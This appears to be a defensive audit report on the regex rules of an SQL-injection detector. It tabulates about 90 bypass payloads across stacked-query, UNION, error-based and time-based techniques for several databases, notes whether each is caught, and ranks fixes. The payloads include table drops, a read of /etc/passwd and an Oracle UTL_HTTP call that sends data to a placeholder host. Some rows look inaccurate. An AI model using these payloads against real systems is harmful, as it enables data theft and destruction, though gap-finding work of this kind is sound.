# SQL Injection Deep Adversarial Analysis Report
## Beyond Tautology — Detection Gap Assessment

---

## 1. STACKED EXECUTION

### Current Detection Pattern
```regex
/;\s*(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE|CALL|UNION|WITH|MERGE|GRANT|REVOKE|SHUTDOWN|TRUNCATE)\b/i
```

### Analysis
The regex requires:
1. A semicolon `;` as statement terminator
2. Optional whitespace
3. A keyword from the blocklist

### Bypass Vectors Identified

| # | BYPASS_PAYLOAD | DETECTED_BY_CURRENT_REGEX | FIX_NEEDED | NOTES |
|---|----------------|---------------------------|------------|-------|
| 1 | `$body$; DROP TABLE users$body$` | **NO** | YES | PostgreSQL dollar-quoting hides the semicolon and keyword inside a named dollar quote. The regex sees `$body$` text, not the `; DROP`. |
| 2 | `DECLARE @s VARCHAR(100); SET @s='DROP TABLE users'; EXEC(@s)` | **NO** | YES | MSSQL dynamic execution. The actual `DROP` is inside a string literal, bypasses keyword detection. |
| 3 | `PREPARE stmt FROM 'DROP TABLE users'; EXECUTE stmt` | **PARTIAL** | YES | MySQL prepared statements. `PREPARE` and `EXECUTE` keywords are NOT in the current blocklist. `DROP` is inside string. |
| 4 | `SET @a='DROP'; PREPARE s FROM @a; EXECUTE s` | **NO** | YES | String concatenation before prepare. Dynamic SQL construction. |
| 5 | `\'; CREATE TABLE pwned (id INT)--` | **NO** | YES | PostgreSQL \g command acts as statement terminator (alternative to semicolon). |
| 6 | `';\nSELECT * FROM password--` | **NO** | YES | Newline as statement separator in some contexts (PostgreSQL, MySQL in certain modes). |
| 7 | `'\0; DROP TABLE users--` | **MAYBE** | YES | Null byte injection may bypass string parsing before regex application. |
| 8 | `'; EXECUTE IMMEDIATE 'DROP TABLE users'--` | **NO** | YES | Oracle EXECUTE IMMEDIATE not in keyword list. |
| 9 | `'; DO $$ BEGIN PERFORM pg_sleep(5); END $$` | **NO** | YES | PostgreSQL DO blocks with anonymous code blocks. `DO` keyword not blocked. |
| 10 | `'; EXEC sp_executesql N'DROP TABLE users'--` | **PARTIAL** | YES | MSSQL sp_executesql. `EXEC` is detected but `sp_executesql` construction might evade detection if input is split. |

### Summary
- **Total bypass vectors identified:** 10
- **Currently detected:** 1-2 (depending on exact input)
- **Fix priority:** HIGH — Dynamic SQL execution vectors are widely exploited

---

## 2. UNION EXTRACTION

### Current Detection Pattern
```regex
classic:    /UNION\s+(?:ALL\s+)?SELECT\s/i
obfuscated: /(?:^|[^a-z])U\s*N\s*I\s*O\s*N\s*(?:A\s*L\s*L\s*)?S\s*E\s*L\s*E\s*C\s*T(?:\s|$)/i
```

### Analysis
The regex assumes `UNION` is always followed by optional `ALL` then `SELECT`. However, SQL standard allows several variations.

### Bypass Vectors Identified

| # | BYPASS_PAYLOAD | DETECTED_BY_CURRENT_REGEX | FIX_NEEDED | NOTES |
|---|----------------|---------------------------|------------|-------|
| 1 | `' UNION (SELECT 1,2,3)--` | **NO** | YES | Subquery form with parentheses. Pattern expects `SELECT` directly, not `(SELECT`. |
| 2 | `' UNION DISTINCT SELECT 1,2,3--` | **NO** | YES | `DISTINCT` is the default but can be explicit. Pattern only allows `ALL`. |
| 3 | `' UNION VALUES(1,'x',3)--` | **NO** | YES | PostgreSQL VALUES clause without SELECT. Valid SQL: `UNION VALUES(...)`. |
| 4 | `' UNION TABLE users--` | **NO** | YES | PostgreSQL TABLE expression: `UNION TABLE tablename` equivalent to `UNION SELECT * FROM`. |
| 5 | `' UNION SELECT * FROM (VALUES (1),(2)) AS t` | **PARTIAL** | YES | Uses VALUES as subquery source. May detect `SELECT` but not the UNION context. |
| 6 | `' UNION/*comment*/ALL SELECT 1,2,3--` | **MAYBE** | YES | Comments between `UNION` and `ALL`. The stripSqlComments only runs in stacked-execution, not here. |
| 7 | `' UNION ALL (TABLE users)` | **NO** | YES | Combination of ALL + TABLE expression (PostgreSQL). |
| 8 | `' ORDER BY 1,2,3 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY` | N/A | NO | This is pagination, but combined with UNION can be used for extraction without traditional UNION SELECT pattern. |

### Advanced UNION Vectors (Less Common)

| # | BYPASS_PAYLOAD | DETECTED_BY_CURRENT_REGEX | FIX_NEEDED | NOTES |
|---|----------------|---------------------------|------------|-------|
| 9 | `' UNION SELECT 1,2 FROM t INTERSECT SELECT 3,4 FROM t2` | **NO** | YES | Compound query with INTERSECT/EXCEPT after UNION. |
| 10 | `' UNION SELECT 1,2,3 ORDER BY 1--` | **PARTIAL** | YES | UNION with ORDER BY. The SELECT is detected but the ORDER BY could change injection behavior. |
| 11 | `' UNION SELECT 1 INTO OUTFILE '/tmp/x'--` | **YES** | NO | Detected, but INTO OUTFILE/DUMPFILE is file write operation not explicitly flagged. |
| 12 | `' UNION SELECT LOAD_FILE('/etc/passwd')--` | **YES** | NO | Detected, but file read operation. |

### Summary
- **Total bypass vectors identified:** 12
- **Currently detected:** 2-3 (basic patterns)
- **Fix priority:** HIGH — UNION extraction is the primary data exfiltration method

---

## 3. ERROR ORACLE

### Current Detection Pattern
```regex
classic:     /(?:EXTRACTVALUE|UPDATEXML|XMLTYPE|CONVERT\s*\(.*USING|EXP\s*\(\s*~|POLYGON\s*\(|GTID_SUBSET|FLOOR\s*\(\s*RAND|GROUP\s+BY\s+.*FLOOR)/i
obfuscated:  /(?:^|['";\)\s])(?:AND|OR)?\s*(?:E\s*X\s*T\s*R\s*A\s*C\s*T\s*V\s*A\s*L\s*U\s*E|U\s*P\s*D\s*A\s*T\s*E\s*X\s*M\s*L|G\s*T\s*I\s*D\s*_?\s*S\s*U\s*B\s*S\s*E\s*T)\s*\(/i
```

### Analysis
The current detection is heavily MySQL-focused (EXTRACTVALUE, UPDATEXML, GTID_SUBSET, FLOOR/RAND). Missing database-specific error oracles for PostgreSQL, MSSQL, Oracle, and SQLite.

### Bypass Vectors Identified

#### MySQL/MariaDB (Additional Vectors)

| # | BYPASS_PAYLOAD | DETECTED_BY_CURRENT_REGEX | FIX_NEEDED | NOTES |
|---|----------------|---------------------------|------------|-------|
| 1 | `' AND 1=(SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)` | **YES** | NO | Detected by FLOOR/RAND pattern. This is the classic "GROUP BY duplicate entry" error. |
| 2 | `' AND GTID_SUBSET(@@version,1)` | **YES** | NO | Detected by GTID_SUBSET pattern. |
| 3 | `' AND MASTER_POS_WAIT(@@version,1)` | **NO** | YES | Alternative to GTID_SUBSET for error-based. |
| 4 | `' AND ST_GEOMFROMTEXT('POINT(1 2)',1)` | **NO** | YES | MySQL spatial function errors with invalid SRID. |
| 5 | `' AND ST_LINEFROMTEXT('LINESTRING(0 0,1 1)')` | **NO** | YES | Geometry parsing errors. |
| 6 | `' AND JSON_KEYS((SELECT * FROM (SELECT * FROM (SELECT @@version)a)b))` | **NO** | YES | JSON function errors on non-JSON input. |
| 7 | `' AND JSON_ARRAY_APPEND((SELECT 1), '$', 1)` | **NO** | YES | JSON function type mismatch. |

#### PostgreSQL Error Vectors

| # | BYPASS_PAYLOAD | DETECTED_BY_CURRENT_REGEX | FIX_NEEDED | NOTES |
|---|----------------|---------------------------|------------|-------|
| 8 | `' AND 1=CAST((SELECT version()) AS INTEGER)` | **NO** | YES | Classic PostgreSQL error: `invalid input syntax for integer`. |
| 9 | `' AND 1=((SELECT version())::INTEGER)` | **NO** | YES | PostgreSQL cast syntax using `::`. |
| 10 | `' AND 1=(SELECT version()::INTEGER)` | **NO** | YES | Cast in subquery. |
| 11 | `' AND 1=(SELECT 1 FROM pg_sleep(0))` | **NO** | YES | ERROR: `NULL value cannot be assigned`. |
| 12 | `' AND (SELECT string_agg(table_name,',') FROM information_schema.tables)` | **NO** | YES | Type mismatch in string_agg. |
| 13 | `' AND 1=(SELECT CHR(65)||CHR(66) FROM (SELECT 1)a GROUP BY CHR(65)||CHR(66) HAVING COUNT(*)>1)` | **NO** | YES | PostgreSQL GROUP BY with mismatch. |
| 14 | `' AND 1=(SELECT XMLPARSE(DOCUMENT (SELECT version())))` | **NO** | YES | XML parsing error on non-XML input. |
| 15 | `' AND 1=(SELECT lo_from_bytea(0, (SELECT version())))` | **NO** | YES | Large object function type error. |

#### Microsoft SQL Server Error Vectors

| # | BYPASS_PAYLOAD | DETECTED_BY_CURRENT_REGEX | FIX_NEEDED | NOTES |
|---|----------------|---------------------------|------------|-------|
| 16 | `' AND 1=CONVERT(INT,(SELECT @@version))` | **PARTIAL** | YES | `CONVERT` is in pattern but `USING` clause check may miss this. |
| 17 | `' AND 1=CAST((SELECT @@version) AS INT)` | **NO** | YES | CAST to incompatible type. |
| 18 | `' AND 1=CONVERT(INT,DB_NAME())` | **NO** | YES | Database name to int conversion. |
| 19 | `' AND 1=(SELECT 1/0 FROM sysobjects)` | **NO** | YES | Divide by zero error. |
| 20 | `' AND (SELECT 1 FROM (SELECT COUNT(*),@@version x FROM sysobjects GROUP BY x)a)` | **NO** | YES | GROUP BY with @@version (no FLOOR/RAND pattern). |
| 21 | `' AND 1=(SELECT COL_LENGTH('nonexistent','col'))` | **NO** | YES | NULL result causes error in some contexts. |
| 22 | `' AND 1=(SELECT HASHBYTES('MD5', (SELECT @@version)))` | **NO** | YES | Hash function on incompatible type. |
| 23 | `' AND (SELECT 1 WHERE 1=(SELECT 1 FROM (SELECT @@version)a))` | **NO** | YES | Subquery error propagation. |
| 24 | `' AND 1=(SELECT name FROM master..sysdatabases WHERE name='' having 1=1)` | **NO** | YES | HAVING without GROUP BY errors. |

#### Oracle Error Vectors

| # | BYPASS_PAYLOAD | DETECTED_BY_CURRENT_REGEX | FIX_NEEDED | NOTES |
|---|----------------|---------------------------|------------|-------|
| 25 | `' AND 1=CAST('a' AS NUMBER)` | **NO** | YES | ORA-01722: invalid number. |
| 26 | `' AND 1=(SELECT UTL_HTTP.REQUEST('http://x/'||(SELECT user FROM dual)) FROM dual)` | **NO** | YES | UTL_HTTP network error + data exfil. |
| 27 | `' AND 1=(SELECT CTXSYS.DRITHSX.SN(user, user) FROM dual)` | **NO** | YES | Oracle Text index error. |
| 28 | `' AND 1=(SELECT XMLType('<'||(SELECT user FROM dual)||'>') FROM dual)` | **PARTIAL** | YES | XMLType is in pattern, but `FROM dual` construction may evade. |
| 29 | `' AND 1=(SELECT TO_NUMBER((SELECT user FROM dual)) FROM dual)` | **NO** | YES | TO_NUMBER on non-numeric string. |
| 30 | `' AND 1=(SELECT ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT user FROM dual),1,1) FROM dual)` | **NO** | YES | Oracle Multimedia error. |
| 31 | `' AND 1=(SELECT STANDARD_HASH((SELECT user FROM dual),'SHA3') FROM dual)` | **NO** | YES | Hash function error. |
| 32 | `' AND 1=(SELECT JSON_ARRAY((SELECT banner FROM v$version) RETURNING CLOB) FROM dual)` | **NO** | YES | JSON array construction errors. |

#### SQLite Error Vectors

| # | BYPASS_PAYLOAD | DETECTED_BY_CURRENT_REGEX | FIX_NEEDED | NOTES |
|---|----------------|---------------------------|------------|-------|
| 33 | `' AND 1=(SELECT load_extension('/tmp/evil.so'))` | **NO** | YES | Extension loading error (if enabled). |
| 34 | `' AND 1=(SELECT group_concat(sql) FROM sqlite_master WHERE 1=1 GROUP BY sql HAVING count(*)>1)` | **NO** | YES | GROUP BY/HAVING error. |

### Summary
- **Total bypass vectors identified:** 34
- **Currently detected:** ~4-5 (MySQL-centric)
- **Fix priority:** CRITICAL — Error-based injection is silent and powerful, current detection misses 85%+ of database-specific vectors

---

## 4. TIME ORACLE

### Current Detection Pattern
```regex
classic:          /(?:SLEEP\s*\(|WAITFOR\s+DELAY|BENCHMARK\s*\(|PG_SLEEP\s*\(|DBMS_PIPE\.RECEIVE_MESSAGE)/i
obfuscatedFuncs:  /(?:^|['";\)\s])(?:AND|OR)?\s*(?:S\s*L\s*E\s*E\s*P|P\s*G\s*_?\s*S\s*L\s*E\s*E\s*P|B\s*E\s*N\s*C\s*H\s*M\s*A\s*R\s*K|D\s*B\s*M\s*S\s*_?\s*P\s*I\s*P\s*E\s*\.\s*R\s*E\s*C\s*E\s*I\s*V\s*E\s*_?\s*M\s*E\s*S\s*S\s*A\s*G\s*E|D\s*B\s*M\s*S\s*_?\s*L\s*O\s*C\s*K\s*\.\s*S\s*L\s*E\s*E\s*P)\s*\(/i
obfuscatedWaitfor: /(?:^|['";\)\s])\s*W\s*A\s*I\s*T\s*F\s*O\s*R\s*D\s*E\s*L\s*A\s*Y\s*['"]?\d{1,2}:\d{1,2}:\d{1,2}['"]?/i
```

### Analysis
Detection covers basic time functions but misses conditional time delays, heavy computation techniques, and database-specific variants.

### Bypass Vectors Identified

#### MySQL/MariaDB Time Vectors

| # | BYPASS_PAYLOAD | DETECTED_BY_CURRENT_REGEX | FIX_NEEDED | NOTES |
|---|----------------|---------------------------|------------|-------|
| 1 | `' AND IF(1=1,SLEEP(5),0)--` | **NO** | YES | Conditional IF with SLEEP. Current pattern doesn't detect IF wrapper. |
| 2 | `' AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--` | **NO** | YES | CASE statement wrapper. |
| 3 | `' AND IFNULL((SELECT SLEEP(5)),0)` | **NO** | YES | IFNULL wrapper. |
| 4 | `' AND NULLIF(SLEEP(5),0)` | **NO** | YES | NULLIF wrapper. |
| 5 | `' AND BENCHMARK(1000000000,SHA1('a'))--` | **YES** | NO | Detected by BENCHMARK pattern. |
| 6 | `' AND BENCHMARK(10000000,MD5('a'))--` | **YES** | NO | Detected by BENCHMARK pattern. |
| 7 | `' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)` | **NO** | YES | Heavy JOIN causing CPU delay (cartesian product). |
| 8 | `' AND (SELECT * FROM (SELECT SLEEP(5))a)` | **PARTIAL** | YES | Subquery-wrapped SLEEP may evade detection. |
| 9 | `' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)` | **PARTIAL** | YES | SLEEP with FROM DUAL qualifier. |

#### PostgreSQL Time Vectors

| # | BYPASS_PAYLOAD | DETECTED_BY_CURRENT_REGEX | FIX_NEEDED | NOTES |
|---|----------------|---------------------------|------------|-------|
| 10 | `' AND (SELECT 1 FROM PG_SLEEP(5))` | **YES** | NO | Detected by PG_SLEEP pattern. |
| 11 | `' AND (SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END)` | **YES** | NO | Detected but should verify obfuscated pattern works. |
| 12 | `' AND (SELECT 1 FROM (SELECT 1)a WHERE 1=(SELECT 1 FROM PG_SLEEP(5)))` | **NO** | YES | Deeply nested PG_SLEEP. |
| 13 | `' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,100000000))` | **NO** | YES | CPU-heavy computation instead of sleep. |
| 14 | `' AND (SELECT 1 FROM REGEXP_MATCHES('x', (SELECT REPEAT('x',10000000))))` | **NO** | YES | Heavy regex computation. |
| 15 | `' AND (SELECT STRING_AGG(GENERATE_SERIES::TEXT,',') FROM GENERATE_SERIES(1,1000000))` | **NO** | YES | Heavy string aggregation. |
| 16 | `' AND (SELECT 1 FROM (SELECT 1)a WHERE 1=1 AND (SELECT 1 FROM PG_SLEEP(5)) IS NOT NULL)` | **NO** | YES | PG_SLEEP in WHERE clause with IS NOT NULL. |

#### Microsoft SQL Server Time Vectors

| # | BYPASS_PAYLOAD | DETECTED_BY_CURRENT_REGEX | FIX_NEEDED | NOTES |
|---|----------------|---------------------------|------------|-------|
| 17 | `'; IF 1=1 WAITFOR DELAY '0:0:5'--` | **YES** | NO | Detected by WAITFOR pattern. |
| 18 | `'; WAITFOR TIME '23:59:59'--` | **NO** | YES | WAITFOR TIME waits until specific time (could be long). |
| 19 | `'; IF (SELECT 1)=1 WAITFOR DELAY '0:0:5'--` | **YES** | NO | Conditional WAITFOR. Should be detected. |
| 20 | `' AND (SELECT 1 FROM (SELECT COUNT(*) FROM sysobjects a, sysobjects b, sysobjects c)t)` | **NO** | YES | CPU-heavy query (cartesian product). |
| 21 | `'; DECLARE @t DATETIME; SET @t=DATEADD(ms,5000,GETDATE()); WHILE GETDATE()<@t SELECT 1--` | **NO** | YES | Custom busy-wait loop. |
| 22 | `' AND (SELECT COUNT(*) FROM sys.all_objects CROSS JOIN sys.all_objects)` | **NO** | YES | CPU-heavy CROSS JOIN. |

#### Oracle Time Vectors

| # | BYPASS_PAYLOAD | DETECTED_BY_CURRENT_REGEX | FIX_NEEDED | NOTES |
|---|----------------|---------------------------|------------|-------|
| 23 | `' AND 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL)` | **YES** | NO | Detected by DBMS_PIPE pattern. |
| 24 | `' AND 1=(SELECT DBMS_LOCK.SLEEP(5) FROM DUAL)` | **MAYBE** | YES | DBMS_LOCK.SLEEP is in obfuscated pattern but classic pattern misses it. |
| 25 | `' AND 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE((SELECT user FROM DUAL),5) FROM DUAL)` | **NO** | YES | Subquery in pipe name parameter. |
| 26 | `' AND 1=(SELECT UTL_HTTP.REQUEST('http://slow-server.example.com/') FROM DUAL)` | **NO** | YES | Network-based delay (out-of-band). |
| 27 | `' AND 1=(SELECT UTL_INADDR.GET_HOST_NAME('8.8.8.8') FROM DUAL)` | **NO** | YES | DNS lookup delay. |
| 28 | `' AND 1=(SELECT HTTPURITYPE('http://slow-server.example.com/').GETCLOB() FROM DUAL)` | **NO** | YES | HTTP request delay. |
| 29 | `' AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS CROSS JOIN ALL_OBJECTS CROSS JOIN ALL_OBJECTS)` | **NO** | YES | CPU-heavy cartesian product. |

#### SQLite Time Vectors

| # | BYPASS_PAYLOAD | DETECTED_BY_CURRENT_REGEX | FIX_NEEDED | NOTES |
|---|----------------|---------------------------|------------|-------|
| 30 | `' AND (SELECT randomblob(1000000000))` | **NO** | YES | CPU-intensive random blob generation. |
| 31 | `' AND (SELECT hex(randomblob(1000000000)))` | **NO** | YES | Heavy hex encoding of random blob. |
| 32 | `' AND (SELECT length(randomblob(1000000000)))` | **NO** | YES | Length calculation of large blob. |
| 33 | `' AND (WITH RECURSIVE t(n) AS (VALUES(1) UNION ALL SELECT n+1 FROM t WHERE n<10000000) SELECT count(*) FROM t)` | **NO** | YES | Recursive CTE causing CPU delay. |
| 34 | `' AND (SELECT COUNT(*) FROM (SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3)a, (SELECT 1 UNION ALL SELECT 2)b, (SELECT 1 UNION ALL SELECT 2)c, (SELECT 1 UNION ALL SELECT 2)d, (SELECT 1 UNION ALL SELECT 2)e, (SELECT 1 UNION ALL SELECT 2)f)` | **NO** | YES | Cartesian product of UNION ALL results. |

### Summary
- **Total bypass vectors identified:** 34
- **Currently detected:** ~8-10
- **Fix priority:** HIGH — Time-based detection is critical for blind SQLi, heavy computation vectors completely bypass current detection

---

## SUMMARY MATRIX

| CLASS | TOTAL_VECTORS | DETECTED | BYPASSED | BYPASS_RATE |
|-------|--------------|----------|----------|-------------|
| STACKED_EXECUTION | 10 | 1-2 | 8-9 | 80-90% |
| UNION_EXTRACTION | 12 | 2-3 | 9-10 | 75-83% |
| ERROR_ORACLE | 34 | 4-5 | 29-30 | 85-88% |
| TIME_ORACLE | 34 | 8-10 | 24-26 | 71-76% |
| **TOTAL** | **90** | **15-20** | **70-75** | **78-83%** |

---

## RECOMMENDED FIX PRIORITIES

### P0 (Critical)
1. **PostgreSQL/MSSQL/Oracle error functions** — Add CAST, CONVERT, TO_NUMBER, ::operator patterns
2. **Dynamic SQL execution** — Add PREPARE/EXECUTE, sp_executesql, EXECUTE IMMEDIATE patterns
3. **Heavy computation delays** — Add patterns for cartesian products, recursive CTEs, RANDOMBLOB

### P1 (High)
1. **PostgreSQL dollar-quoting** — Handle $tag$...$tag$ syntax in stacked query detection
2. **UNION subquery forms** — Add `UNION (SELECT...)` pattern
3. **Conditional wrappers** — Add IF/CASE/SWITCH pattern detection for time functions

### P2 (Medium)
1. **UNION VALUES/TABLE** — Add PostgreSQL-specific UNION forms
2. **Oracle out-of-band** — Add UTL_HTTP, HTTPURITYPE, DNS lookup patterns
3. **Comment injection** — Ensure stripSqlComments is applied consistently across all detectors

---

*Analysis generated: 2026-03-08*
*Scope: Reconnaissance only — No files modified*
